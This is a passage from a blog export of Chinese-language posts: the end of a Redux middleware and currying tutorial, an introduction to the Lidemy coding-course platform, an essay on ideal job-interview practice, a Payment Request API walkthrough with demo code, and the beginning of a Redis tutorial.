store.getState()); return result; &#125;;&#125; 可以看到跟之前長得很像，只是原本的next是放在裡面，現在變成參數傳進來 那我們在使用的時候就變成 123456789101112131415161718192021222324let dispatch = store.dispatch;dispatch = crashReporter(store, dispatch);dispatch = logger(store, dispatch);dispatch(addTodo('Use Redux'));function logger(store, next) &#123; return function dispatchAndLog(action) &#123; console.log('dispatching', action); let result = next(action); console.log('next state', store.getState()); return result; &#125;;&#125;function crashReport(store, next) &#123; return function dispatchAndReportErrors(action) &#123; try &#123; return next(action); &#125; catch (err) &#123; console.error('Caught an exception!', err); throw err; &#125; &#125;;&#125; 差別在於函式裡面的let next = store.dispatch;被拿掉了 我們的middleware函式logger跟crashReport變得更乾淨了點 改成這樣之後，把我們原本的applyMiddleware也改掉，讓它符合新的寫法 123456789101112function applyMiddleware(store, middlewares) &#123; let dispatch = store.dispatch; middlewares.forEach(middleware =&gt; dispatch = middleware(store,dispatch) ); return Object.assign(&#123;&#125;, store, &#123; dispatch &#125;);&#125;//呼叫的方式一模一樣，只是差別在於這個function現在會回傳一個storeapplyMiddleware(store, [logger, crashReporter]); 接著我們回來看官方給的文件跟範例，跟現在我們寫的有哪邊不一樣 第一個點是，logger跟crashReport我們是傳入兩個參數，但是官方的實現只傳入了一個 用了一種叫做currying的技巧 什麼是currying？就是把多個參數的函數切成很多只有一個參數的函數 直接看範例比較了解： 1234567891011function max(a,b)&#123; return a&gt;b?a:b;&#125;max(1,5);function maxCurrying(a)&#123; return function inner(b)&#123; return a&gt;b?a:b; &#125;&#125;maxCurrying(1)(5); 有了基本概念以後，就可以把我們剛剛的logger函式也做這樣的改變 1234567891011121314151617181920212223242526272829//可以跟原來的比較，發現只是多一層函數包住而已function logger(store) &#123; return function wrapDispatchToAddLogging(next) &#123; return function dispatchAndLog(action) &#123; console.log('dispatching', action); let result = next(action); console.log('next state', store.getState()); return result; &#125;; &#125;&#125;//ES6的寫法const logger = store =&gt; next =&gt; action =&gt; &#123; console.log('dispatching', action); let result = next(action); console.log('next state', store.getState()); return result;&#125;;//原來的function logger(store, next) &#123; return function dispatchAndLog(action) &#123; console.log('dispatching', action); let result = next(action); console.log('next state', store.getState()); return result; &#125;;&#125; 在我當初看官方文件的時候，最困擾我的就是這一段 因為之前很少用這種function回傳function又回傳function的寫法 所以一下子被弄得頭昏眼花 於是只好先找出不要那麼多層函數的方法，然後了解currying之後再去了解原本的code 對我來說這樣子會比較容易啦，不然一下子跳太快 applyMiddleware就可以改成這樣 123456789101112131415161718function applyMiddleware(store, middlewares) &#123; let dispatch = store.dispatch; middlewares.forEach(middleware =&gt; dispatch = middleware(store)(dispatch) //差在這裡而已 ); return Object.assign(&#123;&#125;, store, &#123; dispatch &#125;);&#125;//原來的function applyMiddleware(store, middlewares) &#123; let dispatch = store.dispatch; middlewares.forEach(middleware =&gt; dispatch = middleware(store,dispatch) //差在這裡而已 ); return Object.assign(&#123;&#125;, store, &#123; dispatch &#125;);&#125; 其實做到這邊，就已經跟redux本身的實現有個八分像了 事實上middleware的寫法其實就是redux要求的寫法 最後來看一下官方提供的用法要怎麼用 1234567891011121314151617import &#123; createStore, combineReducers, applyMiddleware &#125; from 'redux';// applyMiddleware takes createStore() and returns// a function with a compatible API.// 注意到這邊，我們剛剛的寫法是：applyMiddleware(store, [logger, crashReporter]);// 這邊做了currying，所以把兩個參數變成兩個函數// 本來我們是傳進陣列，這邊把陣列拿掉了，只要依序傳進去就好let createStoreWithMiddleware = applyMiddleware( logger, crashReporter)(createStore);// Use it like you would use createStore()let todoApp = combineReducers(reducers);//用createStoreWithMiddleware取代原本的createStorelet store = createStoreWithMiddleware(todoApp); ##總結 在看官方文件的時候，一直到前面都還看得懂，只是一下突然跳到currying那邊 因為對這個概念比較陌生，所以就暈頭轉向了 後來下定決心一定要看懂，重新看一次之後，一行一行去理解是什麼意思、流程怎麼跑 之後就比較清楚了 這邊大幅度參考官方範例，code也是直接抄來的，只是有做了一點小改變所以在這邊說明 像是官方範例的applyMiddleware裡面，其實前面都有 12middlewares = middlewares.slice();middlewares.reverse(); reverse()是因為執行順序的關係，slice()是複製這個array 但是為什麼要複製我就不知道了，是因為不要改到原本的參數嗎？ 總之，希望這篇文章能幫助到一些跟我一樣迷惑的初學者 最後還是要推薦大家去看官方文件 如果有哪邊寫錯，還麻煩留言或是寄信跟我說，感謝大家 ref: http://camsong.github.io/redux-in-chinese/docs/advanced/Middleware.html","link":"/2015/09/03/javascript-redux-middleware-details-tutorial/"},{"title":"Lidemy 鋰學院：為初學者而生的線上程式課程平台","text":"前言 最近剛把 Lidemy 鋰學院這個線上程式課程平台給弄好，目前這網站是建在 Teachable 上面，一個能夠快速搭建課程平台的服務。 而這篇呢，就要來談談 Lidemy 的創辦背景以及理念 緣起 我一直是個很喜歡教學的人，從最早在前公司開設的實體課程，到台北的免費程式教學，再到 Hahow 的初心者的計概與 coding 火球術，最後是近期的從新手到中手：前端工程加強班。 有關於我個人的完整歷程可以參考自學、哲學、講學：我的程式之路。或許是因為我的背景多元的關係，在教學這一塊讓我有著更多的優勢，在很多時候，我都可以把一個東西講得更淺顯易懂，更讓學生們聽懂。 上面所提到的那些教學有線下的也有線上的，大部分是免費的，而唯一的付費課程我也決定在合約到期之後轉為免費。我上面這些教學的初衷都是一樣的，為的就是能讓初學者更順利地入門程式設計這一個領域。 我一直認為，教學是一件雙向的事情，不只付出是雙向的，連「教學」這件事情都是雙向的。在教學的過程中，老師同時也是學生，學生也同時是老師，彼此都能從對方身上學到些什麼。 常常看到有許多初學者們覺得程式很難，自己那麼笨一定學不會，或者是買了課程來看卻發現老師講的他都聽不懂。我想跟你們說，這不是你的錯，而是那個老師還可以教得更好。我一直是秉持著這個理念要求自己的。如果學生聽不懂、學不會，不是他們的錯，是我的。是因為我沒有用更淺顯的範例讓他們聽懂，沒有把課程設計得更好、更適合初學者。 有件事情我講過很多次了，那就是我分享的初衷其實是「幫助以前的自己」，我只是不想讓像以前的我一樣的人卡在原地不知道該怎麼辦。身為一個已經走過來，已經克服困難的人，我希望用我走過以後學到的知識去幫助以前的自己，能跟同樣卡在原地的人說：「像這個概念啊，我那時候也想了好久，最後才發現其實就只是…」 除了線上課程，我也在 blog 上面寫了很多與初學者相關的文章，像是：程式新手常見問題：解惑篇、為什麼你應該從 Scratch 開始學程式、[心得] 十年程式自學之路、如海洋般的程式課程：CS50等等。 其實一直以來我都有想過自己跳出來弄一個線上課程平台，在 Hahow 開課以前就曾經想過，也曾經想過開設實體課程，但一直沒有行動是因為覺得手邊的資源還不夠，還可以再多累積一段時間。 前陣子有一天我想搜尋一篇文章，用程式 自學、程式 教學、程式 入門等等的關鍵字去搜尋，發現搜尋結果的前三名都是我的文章，同時我那時候也正進行著從新手到中手：前端工程加強班的教學，發現自己教學的次數其實不少，文章也寫得不少，好像是時候把我手邊的資源做個整理了。 因此，Lidemy 鋰學院就這樣誕生了。 為什麼叫 Lidemy? 之前有一個文章寫信來找我合作，問我是否能轉在部落格上的文章，並且請我提供一張 Logo 的照片。那時候我想不到 Logo 要放什麼，這邊我經營這麼久也沒有一個 Logo，後來跟一個朋友聊，他跟我說：不然就用你杯子那張啊！ 這杯子是我在賽先生科學工廠買的，看到的第一眼我就決定要買了。因為 Li 剛好是我名字中的一個字，也剛好是一個化學元素的名字。 後來要幫這個新的線上程式課程平台取名的時候，我就立刻想到了這一個字以及這一個 Logo，連中文都順便想好了，「鋰學院」取「理學院」的諧音，儘管程式比較像什麼電資學院在做的事情，但以「理科」來說好像也能勉強碰上邊。 因此，我很快就決定了 Logo 跟中文名稱，接著就差英文名稱了。 英文名稱我直接從中文去發想，查一查學院的翻譯，可以叫做：college, Faculty，但我都覺得不太適合。我有想過 Li Bootcamp 或是 Li School，也覺得有點奇怪。 直到有一天無意間發現 Academy 也是學院的意思，Li Academy，就決定是這個了！ 決定以後我立刻上網註冊網域，發現 liacademy.com 已經被買走了，只能用 liacademy.tw。不過，我發現居然還有 li.academy 這個超猛的網域可以申請，但要價一年 6000 多台幣，是其他網域的十倍以上。 當下我就想了很久，是不是真的要買這個網域？而且我也不確定這網域是不是只有真的教育機構可以購買（應該不是啦，我白擔心了），就在思考的過程中，我突然想到可以把這兩個單字結合起來，變成 Lidemy。而這名字的好處就是比較好念而且網域又還在。 我就跑去問了一下我室友，他說：「可是這樣不會讓人覺得跟 udemy 很像嗎？」，是的，的確是這樣沒錯，而且 udemy 的 Logo 就是一個 U，連 logo 的感覺也滿像的。後來因為我實在是無法決定，我就把這兩個選項 po 到臉書上讓我的好友們表決，最後 Lidemy 獲得壓倒性勝利。 這就是 Lidemy 這個名稱誕生的故事。 Lidemy 的理念 決定好名稱跟 Logo 之後，就是下一件大事了：slogan。每一個網站幾乎都會有一句 slogan，短短一句話就解釋他們到底在做什麼，我們可以參考一下其他人的： Hahow 好學校：最有趣的線上課程平台 ALPHA Camp：培育全球Startup渴求的人才 六角學院：帶你學到會的線上課程 udemy：Learn Anything, On Your Schedule 我記得當初我第一個想到的是：專門為初學者開設的線上程式課程平台，其他還想到了什麼：誠實的線上程式課程平台、致力做最誠實的線上程式課程平台等等。 總之「線上程式課程平台」這個字是不變的，就看前面要放什麼而已。 最後覺得上面字都太長，而且「誠實」這兩個字雖然我很想放進去，但看起來總覺得怪怪的不太搭，因此就決定縮減為：「為初學者而生的線上程式課程平台」 為初學者而生這個理念滿好理解的，我上面就已經提到很多了，我教學的初衷就是希望能把初學者帶進這個領域，讓她知道其實程式設計一點都不難，而且非常有趣！ 而誠實這個點我很想放進來是因為，我一直很想做一個公開透明的平台。有多公開透明？首先在課程上，我希望能把好評跟負評「並列」在一起，讓所有人都知道學生對於這堂課的反饋是什麼，而不是只有好評。 這樣做或許會影響到銷量，但我覺得無所謂，比起賣得好不好這點，我更希望來購買課程的人，都已經確切知道優缺點是什麼才來購買。我希望他們在完全理解這堂課的評價以及內容之後再購買。 接著如果可以的話，我也想公開經營這個平台的收入與支出是多少，不過這個以後再說啦，畢竟現在一堂付費課程都沒有。 Lidemy 的未來 現在在上面就只有一堂前端程式加強班的課，而 Hahow 上面的課也是一年多之後合約才到期，才能轉到我自己的平台重新上架。 因此，要好好規劃一下之後 Lidemy 上面會有些什麼內容。 就長期目標來看，我想把 Lidemy 打造成一個什麼都有的平台，你想學什麼幾乎都可以在上面找到，想學 Android, iOS, 網頁前後端之類的都有。 但以短期目標來說，應該還是先專攻我比較熟悉的網頁設計這一塊。 之前有一個朋友問我說：「網頁設計的資源已經那麼多了，為什麼你還要再做？」 因為我想讓一個初學者的入門、加強都在同一個課程平台上，要打造這樣的一個學習體系，就必須要自己再跳下來做最基礎的 HTML/CSS/JS 的教學。從最基礎開始教，一直加強一直加強。 以下是我目前規劃的幾個課程，還沒完全確定，但如果有哪一個是你很想上的話，可以在下面留言告訴我，會增加這堂課開成的機率。 HTML/CSS 入門 JavaScript 入門 Git 入門 CS50 導讀 Scratch 入門 React 入門 結語 看了這麼多，如果你對這樣子的教學有興趣，可以先在 Lidemy 鋰學院上面註冊，有新課程的時候就能夠搶先獲得訊息，或是可以追蹤 Lidemy 的 Facebook 粉絲專頁，一樣能夠搶先知道最新消息。 Lidemy 鋰學院的介紹文就到此告一段落，感謝大家。","link":"/2017/06/24/lidemy-online-programming-course-platform-for-the-beginner/"},{"title":"我心目中的理想面試流程","text":"儘管去年面試了大約二十家公司，但我也是一直到最近才明白，面試流程對一間公司來說有多麼重要 當然，HR 的重要程度也非同小可 若是這間公司的 HR 做的很好，面試流程也讓面試者覺得很用心 在這個網路開放的時代，很可能這個求職者之後就會跟朋友分享：欸欸，我今天去 XXX，他們面試流程超棒的欸！ 反之亦然，一個差勁的面試流程，也可能會禍害千年，負評一個接著一個 底下有些實際例子，都是一些正面的例子，我會直接把公司名稱講出來 沒錯，去面試的公司對我好，我都是有記在心裡的！ 今天想跟大家談談我心目中理想的面試流程 大致上可分為三步驟 面試前（安排面試） 面試中 面試後 以下就根據這三個步驟一一來討論 面試前 就我所知，在安排面試的時候主要可分為兩種方式， 電話 信件 用電話安排面試的好處是當下就可以敲定時間，不用透過信件一來一往 但我認為也有一些壞處，像是求職者幾乎都會面試好幾間公司 有可能你打電話去的時候，他正在面試，或是正在忙無法接電話 或是像我那時候安排了一堆面試 他打給我的時候，我必須查看手機的行事曆才知道我哪天有空，可以面試 因此我個人是偏好：先用信件敲時間，兩三天沒有回音的話，才用電話約面試 有一點要補充的是，用電話敲完面試時間之後，HR一定一定一定要再寄一封面試邀請信 就像前面提到的，求職者可能很忙，當下如果沒有即時記錄這時間，之後也不知道從何找起 所以寄信再通知一下面試時間，我覺得是必備而且很貼心的行為 至於用信件安排面試時間，我碰過的有兩種： 直接排定時間給你，不行的話再回信橋時間 先預定好許多日期與時段，自行選擇其中有空的時段 1 跟 2 對公司與求職者來說都有一些顯而易見的優缺點 像是1.如果求職者那天有空，那就很好，時間就這樣橋定了 但如果求職者沒空，就還要繼續書信往返 那2.的話就是公司必須先選好幾個時段是可以面試的，這對有些變動較大的公司似乎比較困難 但對求職者來說，2.的話你可以自己選有空的時段，十分方便 muzik online 就是這樣做的，提供許多時間讓求職者自行選擇 敲好面試時間之後，第二個環節就是：寄送面試通知信 信件上面應該附什麼樣的資訊呢？ 時間 地點 應徵職位 公司電話 其他 這之中在 2.地點 上面，視公司位置可以再多加著墨 為什麼？因為有些公司可能是辦公大樓需要換證、可能位置很難找 這時候如果在信件上面多說一些，會讓求職者覺得很貼心 例如說： 地點：台北市南京北路 689 號 10 樓（在 7-11 樓上，近捷運南京東路站） 可以直接進入大樓，無需換證，到 10 樓出電梯門之後右轉，按鈴說是來面試的即可 這樣就比只有單純講地點的通知信好多了，是吧！ muzik online 的面試信就是這樣 接著在 5.其他 的部份，可以多說明一些與面試有關的相關資訊，例如說 面試流程大約一小時，前面有十分鐘會先讓您填寫個人基本資料 您之前所寄的履歷我們會印出來，所以您無需攜帶 但若是有任何您覺得可以加分、或是證明自己能力的文件或成果，歡迎攜帶相關資料 話說我覺得幫求職者印履歷這個小動作滿貼心的 代表有重視這一份履歷 與求職者有關的部份差不多就到這裡，接著講講公司所要注意的事項 面試官在面試前，最好可以先稍微讀過求職者的履歷 我覺得這滿重要，人家求職者要準備，面試官就不用準備嗎？ 我覺得也要，至少先看過一下他的履歷，到時候問的問題才會比較有深度、可以直接切入重點 而且求職者會知道說：喔～原來他有看過我的履歷了 像是我之前履歷上面都會附個人部落格（其實就是這裡XD） 有面試官如果在我去面試之前有先來逛過一下，我會覺得超級感人，一種「你也太用心了吧」的感覺 面試中 終於來到了面試的這一天，首先有幾種狀況我覺得「絕對不能發生」 讓面試者乾等 面試官找不到人 第一種可能就是在上一個步驟的時候，面試通知信沒有寫清楚要找誰 有些公司可能沒有總機櫃台，也沒有一個專門接待的人，這樣你要求職者問誰？ 這種狀況最好在通知信上面寫清楚，例如說：到公司以後，跟離門口最近的同事說你是來面試的即可 這樣也可以，至少讓他知道他應該要找誰，而不是放求職者在那邊不知所措 還有些是什麼：主管正在開會，可以等一下嗎？ 如果等個十分鐘以內還好，但如果等太久的話就不行 這種也是滿不尊重的，主管今天有會議，那幹嘛在這個時間來找我面試？不能晚個一兩個小時再約嗎？ 大家都知道會議很可能會 delay，但這應該在約時間之前就先考慮進去，沒有把握的話就不要約 第二種狀況我還真的碰過 「今天原本要面試你的人去開會了，那就由我來面試你吧」 沒記錯的話大概是類似這樣的話… 碰到這種狀況其實就乾脆不要跟求職者講，直接假裝原本就是他來面試還比較好 上面這兩種狀況如果都沒發生，那應該很順利的，求職者一到公司之後就順利的見到了 HR 這時候 HR 要做些什麼呢？ 請他填寫資料 說明面試流程 說明公司福利 問求職者有無問題（跟公司有關，HR 可以回答的範圍） 1.的話幾乎每家公司都會有，但我不清楚是法規限制還是慣例 表格上有一堆麻煩的東西要填，例如說家人資料、地址等等的 如果只是慣例的話，我會建議只填一些必要的東西，節省面試時間 不然每次都要填這個落落長的表格，實在是很麻煩 （但如果是有相關法規限制，那就沒辦法了） 2.的話我認為也是很重要的一塊，我之前去面試活動通的時候，HR就很專業的跟我講解面試流程 有一陣子了所以詳細內容我也忘掉了，不過大概是這樣： 我們公司的面試流程有三關 第一關是跟我，我會跟你說明一些公司福利及相關狀況，同時你也可以問我與公司相關的問題 第二關是跟 Android 工程師面試，主要是針對你的技術能力做討論 第三關（如果上一關有過）會跟 CEO 面試，這就是最後一關了 3.的話一般勞基法規定的就不用講了，有額外的才值得提出來講 公司福利就是要大方的讓求職者全部知道阿，有些公司不知道為什麼，就是不說明清楚 像是我現在待的公司：隆中網絡，公司福利有 年假 12 天（勞基法規定 7 天） 免費供應早餐 國外旅遊補助 多益學分補助（依成績加薪） 這些都是 HR 可以先跟求職者說明的內容 HR 面完之後就是職務相關的負責人來面試了 問的問題會是一些專業技能之類的 這部份因為我這篇講的是「流程」而非內容，於是就略過了 面試後 經歷過重重難關，面試終於結束 我認為在面試結束的時候，面試官可以多給一些有用的資訊 而不是萬年老梗的「我跟同事再討論一下，之後會再通知你」 面試結果通知時間 未錄取是否會通知 面試完以後對求職者來說，最重要的就是面試結果 我認為通知以上兩點事項是很有幫助的 1.的話可以不用讓求職者一直等等等 2.的話也是，比起「無聲卡」，感謝信會是比較好的選擇，可以的話我也認為說明理由會比較好 ##總結 俗話說的好：將心比心，把人放在第一位；你自己想要怎樣的面試，就試著把自己公司的面試流程也調整成那樣 把上面說的那些整理一下，大概就會變成這樣（以第一人稱撰寫）： 有天我投了履歷給A公司，應徵工程師的職位，過幾天之後就收到了回信： 您好，收到了您的履歷，本公司對您的專業技能十分感興趣，希望邀請您來面試 公司地點：台北市台北路 3 號 14 樓（全家便利商店樓上，需在一樓櫃檯換證，搭電梯到 14 樓之後右轉，跟總機說您是來面試的即可） 應徵職務：工程師 聯絡電話：02-2222-2222(#621) 陳先生 時間：請在以下的時段內挑選您方便的三個時段並回信給我們，確認以後會再回信給您 1/1 早上 11 點 1/1 下午 3 點 1/4 早上 11 點 1/4 下午 3 點 1/4 下午 5 點 1/5 早上 11 點 1/6 早上 11點 …(略) 於是我就挑了三個時段並且回覆，不久後收到了回信： 您好，以下是您的面試資訊： 公司地點：台北市台北路 3 號 14 樓（全家便利商店樓上，需在一樓櫃檯換證，搭電梯到 14 樓之後右轉，跟總機說您是來面試的即可） 應徵職務：工程師 聯絡電話：02-2222-2222(#621) 陳先生 時間：1/1 早上 11 點 面試流程大約 1 小時，前面 20 分鐘會填寫基本資料以及一份筆試考卷（範圍是基本程式能力） 無需自備履歷，我們這邊會提供；但可以攜帶任何可證明您的專業技能或工作成果的資料 到 1/1 面試的時候，HR 就請我到會議室裡面填資料、寫考卷，寫完之後大致跟我說明了公司狀況、公司福利，以及講解了面試流程，像是面試總共有三關，最後也讓我問問題，確認沒問題之後，就找技術負責人來跟我面試了。 跟技術負責人面試完以後，他跟我說： 今天的面試就到這邊了，我們會再討論是否邀請你來參加第三關的面試 結果大約會在 3 天之後通知你，最晚下禮拜五以前 無論結果是什麼，都會寄信通知 大概過五天以後我就收到這樣的信件： 您好，很感謝您來本公司應徵工程師的職位，但很可惜的，我們認為您的專業知識部分未到達此職位的標準 為不耽誤您其他公司轉任機會，特以此信件通知 （以下官腔、制式說法省略） 如果有公司這樣面試我，就算沒錄取，我也會推薦這間公司。 這不是有沒有錄取的問題，而是有沒有被尊重的問題。","link":"/2016/01/19/my-ideal-interview-process/"},{"title":"統一網頁支付介面：Payment Request API","text":"前言 之前在 Hacker News 上面看到了這一篇文章：Payment Request API — Now Being Implemented in All Major Browsers，大意就是 Payment Request API 這一個東西將會在主流瀏覽器上面被實作出來。 在這之前，我完全沒有聽過這個東西，完全不知道它在做什麼。但經過我稍微研究之後，發現這個原來是網頁支付介面的未來。 Payment Request API 簡介 在瞭解一項新事物以前，我習慣先從「目的」下手，如果你知道這個東西是為了解決什麼問題而誕生，就能對它有最基本的了解。 而 Payment Request API 誕生的原因很簡單，就是為了解決支付問題，尤其是在手機上的支付。 先不要談手機，我們先來談電腦端的支付就好。 現在每個購物網站都有不同的支付介面，串接著不同的金流廠商。假設我今天在蝦皮買了《純粹理性批判》，填了信用卡號碼與收貨地址，蝦皮貼心的幫我記住，於是下一次我再購物時，就不必再填收貨地址了。 可是，如果今天 PChome 商家砸錢放送各種優惠，我決定轉到 PChome 上面購物，我買了一本《夢的解析》，就要再填了一次信用卡號碼跟收貨地址。 問題是什麼？ 問題是每一間公司、每一個網站的結帳流程跟介面都不一樣，雖然大同小異，可是那些資料都是沒有辦法共用的。就算我在 100 個網站都填了收貨地址，我在第 101 個網站還是要重新填一次，因為他沒有我的資料。 上面講的是每一個網站有差異的地方，那有任何相同的地方嗎？ 有，那就是你都用同一個瀏覽器購物。 瀏覽器的初次嘗試：自動填入 上面說的情景其實不太準確，因為你應該會發現其實瀏覽器會自動幫你記憶地址跟信用卡，就可以很方便地使用自動填入的功能。 例如說刷卡的時候只要刷過一次，就可以讓 Chrome 把這一張的卡的資訊記在瀏覽器裡面，下次再到別的網站刷卡時，你只要點一下輸入卡號的輸入框，Chrome 就會提示你說可以用之前的那張卡來付費。 地址也是如此，都有瀏覽器幫你記憶起來，這樣你就只要填一次之後，之後都可以由 Chrome 幫你自動填入。 可是，這樣還有一個問題，那就是結帳的流程跟介面還是不統一，大家都有自己不同的實作，有的支付介面簡直慘不忍睹，尤其是在手機上！ 根據 Google 的統計，有 65.9% 的使用者在手機上購物時，還沒完成所有流程就離開了。這已經超過一半的用戶了，代表許多網站在手機的支付介面這一塊還有很大的努力空間。 而這一次，瀏覽器決定自己跳下來解決這個問題。 瀏覽器：都交給我吧！ 瀏覽器要怎麼解決這個痛點？ 簡單！只要由瀏覽器提供一個統一的結帳介面就好，連流程都一併統一。商家的網頁可以根據需求的不同，帶入不同的參數，但最終都是呼叫瀏覽器提供的 API（也就是我們今天的主角：Payment Request API），叫出瀏覽器原生的介面。 當這個 API 普及並且大家都發現比較好用的時候，所有的網頁都會跟進，都會採取一樣的方式。這樣就能夠確保所有網站的支付流程都統一了。 所以 Payment Request API 到底是什麼？ 簡單來說，就是瀏覽器提供的 API，當網頁端以 JavaScript 呼叫以後，就會出現瀏覽器原生的結帳介面，用來取代原有的商家自有的結帳流程。 直接讓你看一張圖就會理解了： 這個就是呼叫 API 之後的樣子。 要特別注意的一點是 Payment Request API 跟後端「完全無關」，你後端就跟以前一樣接收資料即可。有變動的地方是前端，原本你在前端需要寫的那些結帳頁面，都可以交由瀏覽器來 render 原生的 UI，你只要負責呼叫 Payment Request API 即可。 呼叫以後可以拿到使用者填入的那些資料，把那些資料像以前一樣發送到 Server 端就好。 但要注意的是這個 API 還不普及，根據 caniuse.com 的資料，只有 Chrome 61 版、Edge 15 跟 Opera 48 以上才支援，其他的瀏覽器還要再等等。 使用流程 說了這麼多，現在就來實際跑一次流程吧！ 我們先建立一個簡單的 demo 頁面，偵測是否支援 Payment Request 以及放置購買按鈕跟回傳的結果： 第一步：創造 Payment Request 物件 PaymentRequest接受三個參數，付款方式、交易資訊跟其他。 12345var request = new PaymentRequest( methodData, // 支援的付款方式 details, // 交易相關的詳細資訊 options // 其他，例如說運送方式等等); 我們先實作一個簡單的 function 回傳建立好的 PaymentRequest： 123456789101112131415161718192021222324252627function createPaymentRequest () &#123; var methodData = [&#123; supportedMethods: ['basic-card'], // 支援信用卡 data: &#123; // 指定更詳細的資訊 supportedNetworks: ['jcb', 'mastercard', 'visa'], supportedTypes: ['debit', 'credit', 'prepaid'] &#125;, &#125;]; var details = &#123; displayItems: [ // 購買的品項 &#123; label: \"TechBridge Weekly 專業版一年份\", amount: &#123; currency: \"TWD\", value : \"3000.00\" &#125; &#125;, &#123; label: \"早鳥優惠\", amount: &#123; currency: \"TWD\", value : \"-300.00\" &#125; &#125; ], total: &#123; label: \"總額\", amount: &#123; currency: \"TWD\", value : \"2700.00\" &#125; &#125; &#125;; return new PaymentRequest(methodData, details);&#125; 這邊有一點要特別注意，那就是total那邊的總額，系統「不會幫你自己算好」，所以儘管上面總和是 2700，你要輸入其他數字也可以。 還有另一個條件是這個 API 不支援退款，所以總和必須是正數。但是每一個品項可以是負數，這樣就可以放一些折扣相關的東西。 第二步：呼叫 API，顯示結帳頁面 建立完 PaymentRequest 之後，可以用.show()顯示結帳 UI，會回傳一個 Promise，使用過後可以拿到使用者的相關資料。我們在購買按鈕按下去之後來進行結帳流程。 12345678function onClick () &#123; var request = createPaymentRequest(); request.show().then(function(PaymentResponse) &#123; handleResponse(PaymentResponse); &#125;).catch(function(err) &#123; console.log(err); &#125;);&#125; 第三步：處理資料及回傳結果 最後一步就是處理上一步拿到的資料，把那些資訊發送到 Server 去完成結帳流程，並且傳回結果，讓 UI 顯示成功或是失敗。我們在這邊只是範例，所以就省略上述步驟，並且直接把上一步拿到的資料轉成 JSON 顯示出來。 123456789101112131415function showResponse (response) &#123; $res.innerHTML = JSON.stringify(response, undefined, 2);&#125; function handleResponse (paymentResponse) &#123; // 可以在這裡把結果回傳 server // 只是示範，所以我們直接將資料顯示出來 showResponse(paymentResponse); // 模擬 API 的延遲 setTimeout(function () &#123; // 結帳成功 paymentResponse.complete(\"success\"); &#125;, 2000);&#125; （這邊的卡號是我在 http://www.getcreditcardnumbers.com/ 隨便產生的） 只要上面簡單的三個步驟，就能夠取得使用者的資料並且完成結帳。比起原先每個網站建立的自有結帳流程，使用 Payment Request API 的好處就是可以帶給使用者原生的結帳體驗，進而增加轉換率。 而上面的三個步驟，最重要的就是第一個帶入參數的部分，這邊還有很多細節可以調整，例如說貨幣種類、要求運送地址，並且可以根據使用者選擇的地址判斷接受或是不接受（例如說不接受送貨到國外，就能在那邊判斷）。 支付方式也可以指定某幾間的信用卡，或甚至是決定要不要支援 debit card。 如果你對這些細項有興趣，可以參考 Google 提供的非常詳細的教學：Deep Dive into the Payment Request API。 原生結帳 UI 如果你想自己跑一遍結帳流程，可以直接去 demo 網頁 試試看。 在這邊我直接截圖給大家看在電腦以及手機上面的結帳流程。 電腦 按下按鈕之後的畫面： 點進訂單摘要： 新增信用卡： 新增地址： 按下支付之後，要求輸入末三碼： 結帳失敗： 手機 按下按鈕之後的畫面： 點進訂單摘要： 新增信用卡： 新增地址： 結帳失敗： 總結 Payment Request API 正在被其他瀏覽器（例如說 Safari）實作，可以預期到將來必定會被廣泛支援。 其實國外的金流廠商 Stripe 已經支援使用 Payment Request API 了。而 PaymentRequest Sample 這個網站也可以看到更多樣化的範例。 這篇文章主要目的是把這項新的標準帶到大家面前，如果覺得很有興趣想要深入研究，底下有附上許多相關資源。 參考資料： MDN - Payment Request API Deep Dive into the Payment Request API Introducing the Payment Request API PaymentRequest Credit Cards Sample w3c/payment-request-info FAQ","link":"/2017/10/04/payment-request-api/"},{"title":"資料庫的好夥伴：Redis","text":"前言 Redis 是一個 in-memory 的 key-value database，因此常常被用在需要快取（Cache）一些資料的場合，可以減輕許多後端資料庫的壓力。這篇就來簡單介紹一下 Redis 提供哪些好用的東西，以及可以應用在什麼地方。 常用指令 Redis 的官網列出了支援的每一條指令，我們先來看看最簡單的： SET, GET 123redis&gt; SET mykey &quot;Hello&quot;redis&gt; GET mykey&quot;Hello&quot; 前面有提到說 Redis 是一個 key-value pair 的資料庫，因此最簡單的 SET 就是設定某個 key 的值是多少，要取出來的話就用 GET 就好。 INCR, DECR 12345redis&gt; SET mykey &quot;10&quot;redis&gt; DECR mykey(integer) 9redis&gt; INCR mykey(integer) 10 顧名思義就是針對某個 key 加一或減一的意思，像是程式語言裡面的mykey++跟mykey--。 還有 INCRBY 與 DECRBY，可以指定你要加減的數量是多少。 HSET, HGET 1234redis&gt; HSET mydata name &quot;nick&quot;redis&gt; HSET mydata nickname &quot;nicknick&quot;redis&gt; HGET mydata name&quot;nick&quot; H 就是 Hashmap 的意思，所以你可以存取一個 value 底下的 field，讓你可以更多元的使用，例如說你可以定義 key 的規則是：POST + 文章 id，裡面就可以存這篇文章的讚數、回覆數等等，就不用每一次都去 Database 裡面重新抓取。 SADD, SCARD 12345redis&gt; SADD myset &quot;nick&quot;redis&gt; SADD myset &quot;peter&quot;redis&gt; SADD myset &quot;nick&quot;redis&gt; SCARD myset(integer) 2 SADD 的 S 就是 Set 的意思，這邊的 Set 指的是資料結構學過的那個 Set，裡面不會有重複的內容。 LPUSH, RPUSH, LSET, LRANGE 123456789101112redis&gt; LPUSH mylist &quot;a&quot;redis&gt; LPUSH mylist &quot;b&quot;redis&gt; RPUSH mylist &quot;c&quot;redis&gt; LRANGE mylist 0 -11) &quot;b&quot;2) &quot;a&quot;3) &quot;c&quot;redis&gt; LSET mylist 0 &quot;d&quot;redis&gt; LRANGE mylist 0 -11) &quot;d&quot;2) &quot;a&quot;3) &quot;c&quot; 這邊的資料結構是 List，你可以選擇從左邊或是右邊 push 值進去，對應到的指令就是 LPUSH 與 RPUSH，LSET 則是指定某個 index 的 value 是多少。 LRANGE 可以印出指定範圍的值，支援-1這種形式，表示最後一個值。 實際應用 Redis 好用的地方就在於速度很快，所以若是開發上碰到一些場合需要速度很快的話，你可以先考慮看看 Redis 是不是能夠幫助到你，以下就舉幾個我實際使用過的例子。 短網址系統 其實短網址的原理非常簡單，就是一個 hash 對應到一個網址，hash 是用隨機產生，幾碼或是要有什麼符號可以自己決定，接著就把這組對應關係存到資料庫裡面，別人 query 相應的 key 時，你就 redirect 到相應的網址去就好了。 也因為是這種 key-value 的一對一關係，所以非常適合使用 Redis。 如果你不用像是 Redis 這種的 key-value cache，就必須「每一次」都從 Database 去 query。若是資料量小還好，但資料量一變大的時候，時間一定會增加，資料庫的負荷也會增加，因此在資料庫跟邏輯層之間引進一層快取，我認為是很好的選擇。 實作的過程也很簡單， 使用者新增短網址，系統亂數產生 abc123 